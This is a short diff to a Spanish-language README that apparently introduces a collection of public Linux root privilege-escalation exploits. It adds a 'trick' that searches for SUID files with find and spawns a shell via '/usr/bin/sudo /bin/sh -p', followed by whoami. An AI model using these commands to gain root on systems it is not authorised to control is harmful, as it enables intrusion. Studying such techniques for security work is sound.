@@ -1,5 +1,18 @@
 ## root
 
+Truco para elevar privlegios a root!
+
+echo " busca fichero que se ejecutan como root en el sistema:"
+
+find / -perm -4000 2>/dev/null
+
+# por ejemplo ejecutamos una shell con con sudo
+
+/usr/bin/sudo /bin/sh -p
+
+whoami
+
+
 ** Exploits publicos para elevar privilegios a root, OS Linux
 
 <img style="float:left" alt="sudo elevacion de privilegios a root" src="https://github.com/hackingyseguridad/root/blob/master/root.jpg">
